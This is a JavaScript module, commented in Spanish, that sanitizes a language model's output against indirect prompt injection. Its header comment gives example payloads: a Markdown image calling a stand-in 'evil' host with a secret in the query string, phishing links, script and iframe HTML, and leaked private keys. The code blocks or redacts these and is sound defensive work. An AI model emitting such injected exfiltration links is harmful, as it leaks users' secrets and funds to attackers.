/**
 * Saneado de la salida del modelo (defensa contra prompt injection indirecta y exfiltración).
 *
 * Un documento o un mensaje malicioso puede conseguir que el modelo escriba:
 *   - imágenes Markdown `![x](https://evil/?d=SECRETO)` → el navegador las pide solas y filtra datos,
 *   - enlaces de phishing con texto engañoso `[Entra en bezhas.com](https://evil)`,
 *   - HTML/JS (`<script>`, `<iframe>`, `javascript:`),
 *   - claves privadas o frases semilla.
 * El texto resultante solo conserva enlaces a rutas internas del catálogo y a dominios propios.
 */
const { isSafePath } = require('./actions');

const TRUSTED_HOSTS = () =>
    (process.env.AI_TRUSTED_LINK_HOSTS || 'bezhas.com,www.bezhas.com').split(',').map((h) => h.trim().toLowerCase()).filter(Boolean);

const BLOCKED_LINK = '[enlace bloqueado]';
const BLOCKED_IMAGE = '[imagen bloqueada]';

function trustedUrl(raw) {
    let u;
    try { u = new URL(raw); } catch (_) { return false; }
    if (u.protocol !== 'https:' || u.username || u.password || u.port) return false;
    return TRUSTED_HOSTS().includes(u.hostname.toLowerCase());
}

const allowedTarget = (target) => {
    const t = String(target || '').trim().replace(/^<|>$/g, '');
    return isSafePath(t) || trustedUrl(t);
};

/** ¿Es un carácter de control (salvo \n y \t) o una marca bidireccional que disfraza texto? Por código de carácter, sin literales bidi. */
const isHiddenChar = (cp) => cp <= 0x08 || cp === 0x0b || cp === 0x0c || (cp >= 0x0e && cp <= 0x1f) || cp === 0x7f
    || (cp >= 0x202a && cp <= 0x202e) || (cp >= 0x2066 && cp <= 0x2069);

function stripHiddenChars(text) {
    let out = '';
    for (const ch of String(text)) if (!isHiddenChar(ch.codePointAt(0))) out += ch;
    return out;
}

/**
 * Recorre `[texto](destino "título")` en tiempo lineal (sin expresión regular con repeticiones anidadas) y
 * llama a `replace(label, target)` por cada enlace bien formado. Límites: texto 300, destino 2000, título 200.
 */
function mapMarkdownLinks(text, replace) {
    let out = '';
    let i = 0;
    while (i < text.length) {
        if (text[i] !== '[') { out += text[i++]; continue; }
        const close = text.indexOf(']', i + 1);
        if (close === -1 || close - i - 1 > 300 || text.slice(i + 1, close).includes('[') || text[close + 1] !== '(') { out += text[i++]; continue; }
        let j = close + 2;
        while (j < text.length && /\s/.test(text[j])) j++;
        const tStart = j;
        while (j < text.length && j - tStart <= 2000 && text[j] !== ')' && !/\s/.test(text[j])) j++;
        const target = text.slice(tStart, j);
        if (j - tStart > 2000) { out += text[i++]; continue; }
        // Título opcional: espacios + "..." (hasta 200 caracteres sin comillas).
        let k = j;
        while (k < text.length && /\s/.test(text[k])) k++;
        if (k > j && text[k] === '"') {
            const endQuote = text.indexOf('"', k + 1);
            if (endQuote !== -1 && endQuote - k - 1 <= 200) { k = endQuote + 1; while (k < text.length && /\s/.test(text[k])) k++; }
        }
        if (text[k] !== ')') { out += text[i++]; continue; }
        out += replace(text.slice(i + 1, close), target);
        i = k + 1;
    }
    return out;
}

const DANGEROUS_ELEMENTS = ['script', 'style', 'iframe', 'object', 'embed', 'svg', 'math', 'form'];
const TRUSTED_AUTOLINK = /^<https?:\/\/[^\s<>]+>$/i;

/**
 * Elimina el HTML con un recorrido lineal (no con `replace`: una sustitución única puede dejar un fragmento que
 * vuelve a formar una etiqueta, p. ej. `<scr<b>ipt>`). Garantía: en la salida NO queda ningún '<' sin escapar,
 * salvo los autoenlaces `<https://...>` que se tratan después. Etiquetas de hasta 500 caracteres; contenido
 * de elementos peligrosos hasta 20000.
 */
function stripHtml(text) {
    let out = '';
    let lower = null; // minúsculas del texto, calculado una sola vez y solo si hace falta
    let i = 0;
    while (i < text.length) {
        const ch = text[i];
        if (ch !== '<') { out += ch; i++; continue; }
        const next = text[i + 1] || '';
        const startsTag = /[A-Za-z/!?]/.test(next) || (next === ' ' && /[A-Za-z/]/.test(text[i + 2] || ''));
        // Búsqueda acotada a 500 caracteres: tiempo lineal incluso con miles de '<' sin cierre.
        const rel = startsTag ? text.slice(i + 1, i + 502).indexOf('>') : -1;
        const end = rel === -1 ? -1 : i + 1 + rel;
        if (!startsTag || end === -1) {
            // '<' seguido de espacio, dígito o '=' (p. ej. `1 < 2` en código) no puede formar etiqueta: se deja tal cual.
            // Cualquier otro '<' se escapa, para que al quitar una etiqueta vecina nunca se recomponga una nueva.
            out += /[\s\d=]/.test(next) && next !== '' && !(next === ' ' && /[A-Za-z/]/.test(text[i + 2] || '')) ? '<' : '&lt;';
            i++;
            continue;
        }
        const tag = text.slice(i, end + 1);
        if (TRUSTED_AUTOLINK.test(tag)) { out += tag; i = end + 1; continue; }
        const name = /^<\s*([A-Za-z][A-Za-z0-9]*)/.exec(tag);
        const isOpening = !!name && !/^<\s*\//.test(tag);
        i = end + 1;
        if (isOpening && DANGEROUS_ELEMENTS.includes(name[1].toLowerCase())) {
            // Salta también el contenido hasta el cierre correspondiente (si no hay, hasta el límite).
            if (lower === null) lower = text.toLowerCase();
            const close = lower.indexOf(`</${name[1].toLowerCase()}`, i);
            if (close !== -1 && close - i <= 20000) {
                const closeEnd = text.indexOf('>', close);
                i = closeEnd === -1 ? text.length : closeEnd + 1;
            }
        }
    }
    return out;
}

function sanitizeModelOutput(input) {
    if (typeof input !== 'string' || !input) return '';
    let text = input;

    // Caracteres de control (salvo \n \t) y marcas bidireccionales que disfrazan texto.
    text = stripHiddenChars(text);

    // Imágenes Markdown: siempre fuera (canal de exfiltración sin interacción).
    text = text.replace(/!\[[^\]]{0,300}\]\([^)]{0,2000}\)/g, BLOCKED_IMAGE);
    text = text.replace(/!\[[^\]]{0,300}\]\[[^\]]{0,100}\]/g, BLOCKED_IMAGE);

    // HTML: se eliminan las etiquetas (y el contenido de las peligrosas); todo '<' restante se escapa.
    text = stripHtml(text);

    // Enlaces Markdown [texto](destino "título"): se conserva solo si el destino es de confianza.
    text = mapMarkdownLinks(text, (label, target) =>
        (allowedTarget(target) ? `[${label}](${target.replace(/^<|>$/g, '')})` : `${label} ${BLOCKED_LINK}`));

    // Definiciones de referencia `[id]: destino`.
    text = text.replace(/^\s{0,3}\[[^\]]{1,100}\]:\s*(\S+).*$/gm, (line, target) => (allowedTarget(target) ? line : BLOCKED_LINK));

    // Autoenlaces <https://...> y URLs sueltas con esquema.
    text = text.replace(/<(https?:\/\/[^\s>]+)>/gi, (m, url) => (trustedUrl(url) ? m : BLOCKED_LINK));
    text = text.replace(/\b(?:https?|ftp|file|data|javascript|vbscript):[^\s)>\]]*/gi, (url) => (trustedUrl(url) ? url : BLOCKED_LINK));

    // Claves privadas (64 hex con o sin 0x) y frases semilla (12/24 palabras BIP-39 típicas no se detectan por
    // diccionario aquí; se cubre el formato de clave que el modelo nunca debe reproducir).
    text = text.replace(/\b(?:0x)?[a-fA-F0-9]{64}\b/g, '[dato sensible oculto]');

    return text;
}

module.exports = { sanitizeModelOutput, stripHiddenChars, stripHtml, trustedUrl, BLOCKED_LINK, BLOCKED_IMAGE };
